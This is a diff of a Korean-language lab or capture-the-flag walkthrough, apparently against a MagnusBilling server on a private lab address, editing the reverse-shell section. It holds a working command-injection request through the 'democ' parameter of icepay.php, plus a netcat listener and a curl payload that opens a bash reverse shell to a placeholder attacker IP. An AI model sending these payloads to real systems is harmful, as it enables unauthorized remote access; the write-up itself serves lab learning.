@@ -130,15 +130,13 @@ curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
 
 #### 4. 리버스 쉘 시도
 ```bash
-# 리스너 설정 (공격자 머신에서)
+# 리스너 설정
 nc -lvnp 4444
+l: listen
+v: verbose mode
+n: numeric-only IP addresses
+p: port number
 
-# 리버스 쉘 페이로드 전송
-# 다른 터미널에서 패킷 모니터링
-sudo tcpdump -i tun0 icmp
-
-# 리스너 실행
-nc -lvnp 4444
 # 리버스 쉘 시도
 curl "http://10.10.141.15/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%27"
 ```
